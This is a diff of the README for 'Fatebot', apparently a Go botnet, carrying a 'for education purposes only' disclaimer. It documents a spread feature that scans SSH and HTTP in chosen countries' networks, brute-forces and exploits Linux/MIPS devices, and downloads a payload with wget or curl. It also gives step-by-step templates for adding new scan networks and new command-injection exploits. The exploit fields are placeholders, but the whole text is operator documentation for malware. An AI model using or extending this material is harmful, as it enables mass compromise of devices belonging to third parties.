@@ -7,7 +7,7 @@
 		<img src="https://img.shields.io/badge/license-Unlicense-red?style=plastic">
 	</a>
 	<a href="https://github.com/boz3r/Fatebot">
-    		<img src="https://img.shields.io/badge/version-v0.8.1.3-lightgrey?style=plastic">
+    		<img src="https://img.shields.io/badge/version-v0.8.2-lightgrey?style=plastic">
 	</a>
 	<a href="https://go.dev/">
     		<img src="https://img.shields.io/badge/language-Go-red?style=plastic">
@@ -21,7 +21,7 @@
 <p align="center">
 	<b><ins>⚠️ DISCLAIMER ⚠️</ins></b>
 	<br>
-	Bozer\Bulldozer (old GitHub name is R4bin) the author of Fatebot.
+	Bozer\Bulldozer (Old GitHub name was R4bin) the author of Fatebot.
 	<br>
 		I create this project for education purposes only, the use of this software is your responsibility!!!
 	<br>
@@ -30,7 +30,7 @@
 ---
 
 # Spread Feature
-The spread feature will scan on the default SSH and HTTP (vulnerabilities). Option about the scan feature in this bot is to scan on CN, HK, KR, and BR network or you can do a random scan or even you can add your mods, all of these is up to you. This bot will brute-force attack and exploit the target device, server, etc that's run Linux or uses MIPS x32 architecture. The loader will use "wget" or "curl" as a default loader for downloading payload from The FTP server or any option in any server type that you can host your payload, not maintionly to be an FTP server.
+The spread feature will scan on the default SSH and HTTP (vulnerabilities). Option about the scan feature in this bot is to scan on CN, USA, KR, and BR networks or you can do a random scan or even you can add your own networks, all of these is up to you. This bot will brute-force attack and exploit the target device, server, etc that's run Linux or uses MIPS x32 architecture. The loader will use "wget" or "curl" as a default loader for downloading payload from The FTP server or any option in any server type that you can host your payload, not maintionly to be an FTP server.
 	
 	# How to add more scanner network (Create your own scan mod).
 	
@@ -38,20 +38,20 @@ The spread feature will scan on the default SSH and HTTP (vulnerabilities). Opti
 	
 		# Example:
 			
-			var ItalyNetwork = []string {
+			var Italy_Network = []string {
 				"123.456", //123.456.0.0/16
 			}
 			
-			# since v0.6.0 will use only 16 bits of the IP range (I'm still confused about the subnet mask Lol).
+			# since v0.6.0 will use only 16 bits of the IP range to set up scan networks (I'm still confused about the subnet mask LOL).
 			
 	2) Go to the header.go file and scroll down to the map name "ScanMap".
 	3) Customize your key and value. The value of the map is structure, so you need to call a value in the "Bot" structure and fill it.
 	
 		# Example:
 		
-			"-it": {				 # This key will be the command of a network arg in the "?scan" command. "it" is short form Italy.
-				scanNetwork: ItalyNetwork, 	 # Fill the "scanNetwork" that's a value of the "Bot" structure. To your network slice.
-				scanOptFull: "\"ITALY\"",	 # Add the full name of the network for a reporting process.
+			"-fi": {				 # This key will be the command of a network arg in the "?scan" command.
+				scanNetwork: Finland_Network, 	 # Fill the "scanNetwork" that's a value of the "Bot" structure. To your network slice.
+				scanOptFull: "\"FINLAND\"",	 # Add the full name of the network for a reporting process.
 				isRandom:    false,		 # Set "isRandom" to false because it's not a full random network.
 			},
 	
@@ -75,7 +75,7 @@ The exploit that's used in this botnet mostly will be a command injection (TBH i
 			
 		newCVE1, _ := json.Marshal(map[string]string{
 			"example":      "something",
-			"example":      "something"+b.inject("default", true),
+			"example":      "something"+b.inject("mips", true),
 		})
 		
 		# This is just a HTTP header customization.
@@ -84,9 +84,9 @@ The exploit that's used in this botnet mostly will be a command injection (TBH i
 		enewCVE1 := Exploit{
 			exploitName:       "CVE_someYear_newCVE1",			# Customize the exploit name for a reporting process.
 			exploitMethod:     "POST",					# Which HTTP method you will use for this exploit?
-			exploitHeader:     "example/something",				# Customize HTTP header.
-			exploitBody:       convReader(newCVE1),				# Customize HTTP body.
-			exploitAgent:      "example"+b.inject("default", true),		# Customize HTTP agent.
+			exploitPath:     "example/something",				# Customize URL path.
+			exploitBody:       strings.NewReader(string(newCVE1)),	        # Customize HTTP body.
+			exploitAgent:      "example"+b.inject("mips", true),		# Customize HTTP agent.
 			exploitAccept:     "example",					# Customize HTTP accept.
 			exploitContType:   "example",					# Customize HTTP content type.
 			exploitConnection: "example",					# Customize HTTP connection.
@@ -108,14 +108,14 @@ The exploit that's used in this botnet mostly will be a command injection (TBH i
 	func (b *Bot) CVE_someYear_newCVE2() {			
 		newCVE2, _ := json.Marshal(map[string]string{
 			"example":      "something",
-			"example":      "something"+b.inject("default", true),
+			"example":      "something"+b.inject("", true),
 		})
 		enewCVE2 := Exploit{
 			exploitName:       "CVE_someYear_newCVE2",			# Customize the exploit name for a reporting process.
 			exploitMethod:     "POST",					# Which HTTP method you will use for this exploit?
-			exploitHeader:     "example/something",				# Customize HTTP header.
-			exploitBody:       convReader(newCVE2),				# Customize HTTP body.
-			exploitAgent:      "example"+b.inject("default", true),		# Customize HTTP agent.
+			exploitPath:       "example/something",				# Customize URL path.
+			exploitBody:       strings.NewReader(string(newCVE2)),	        # Customize HTTP body.
+			exploitAgent:      "example"+b.inject("", true),		# Customize HTTP agent.
 			exploitAccept:     "example",					# Customize HTTP accept.
 			exploitContType:   "example",					# Customize HTTP content type.
 			exploitConnection: "example",					# Customize HTTP connection.
